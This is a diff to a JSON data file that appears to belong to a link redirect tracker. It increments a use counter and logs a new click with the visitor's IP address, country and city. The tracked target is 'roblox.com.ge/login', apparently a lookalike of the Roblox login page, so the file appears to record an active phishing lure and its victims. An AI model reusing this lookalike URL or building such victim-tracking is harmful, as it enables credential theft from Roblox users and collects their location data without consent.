@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1352,
+    "useCount": 1353,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10984,6 +10984,14 @@
         "city": "Helsinki",
         "flag": "🇫🇮",
         "countryCode": "FI"
+      },
+      {
+        "timestamp": 1777415867680,
+        "ip": "103.145.34.141",
+        "country": "Indonesia",
+        "city": "Umbulan Tebingsuluh",
+        "flag": "🇮🇩",
+        "countryCode": "ID"
       }
     ]
   },
